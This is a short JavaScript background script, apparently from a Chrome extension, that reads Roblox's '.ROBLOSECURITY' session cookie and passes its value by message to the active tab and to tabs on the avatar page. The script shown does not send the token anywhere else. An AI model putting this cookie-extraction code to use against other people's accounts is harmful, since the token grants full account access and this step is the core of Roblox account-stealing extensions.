function SendRobloSecurity(TabId){
    console.log(TabId)
    chrome.cookies.get({name: ".ROBLOSECURITY", url: "https://www.roblox.com"}, function(Cookie){
        chrome.tabs.sendMessage(TabId, {
            type: "roblosecurity",
            value: Cookie.value
        })
    })
}

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.url.search("roblox.com/my/avatar") > -1 && tab.status === "complete") {
        SendRobloSecurity(tabId)
    }
})

chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    SendRobloSecurity(tabs[0].id)
})